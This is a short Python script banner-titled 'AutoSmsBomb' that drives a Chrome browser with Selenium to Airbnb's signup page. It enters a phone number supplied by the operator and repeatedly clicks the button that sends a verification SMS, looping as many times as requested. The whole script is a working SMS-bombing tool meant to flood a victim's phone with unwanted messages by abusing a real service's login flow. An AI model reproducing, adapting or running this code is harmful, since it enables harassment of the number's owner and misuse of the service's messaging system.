from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

print("               _        _____               ____                  _  ")   
print("    /\        | |      / ____|             |  _ \                | |   ") 
print("   /  \  _   _| |_ ___| (___  _ __ ___  ___| |_) | ___  _ __ ___ | |__  ")
print("  / /\ \| | | | __/ _ \\___ \| '_ ` _ \/ __|  _ < / _ \| '_ ` _ \| '_ \ ")
print(" / ____ \ |_| | || (_) |___) | | | | | \__ \ |_) | (_) | | | | | | |_) |")
print("/_/    \_\__,_|\__\___/_____/|_| |_| |_|___/____/ \___/|_| |_| |_|_.__/ ")
print("")
print("      [+] made by GH0$TH4CK3R    ")
print("")
                                                                       
#webs = input("Enter the website address : ")
#keywrd = input("Enter the text of the button : ")
#txt = input("Enter number to register : ")
no = input("Enter mobile number : ")
a = int(input("how much sms need to send : "))

driver = webdriver.Chrome("C:/Users/Dimuth De Zoysa/Downloads/chromedriver81/chromedriver.exe")
driver.get("https://www.airbnb.com/signup_login")
time.sleep(5)

#element = driver.find_element_by_link_text("Sign up")
#element.click()
#time.sleep(5)

textbox = driver.find_element_by_id("phoneNumber")
textbox.send_keys(no)
time.sleep(5)

element1 = driver.find_element_by_class_name("_1aqm0kkj")
element1.click()

time.sleep(8)
element2 = driver.find_element_by_class_name("_1d079j1e")

for x in range(a):
  time.sleep(5)    
  element2.click()
  print("sending...")
#driver.exit()
print("Done")






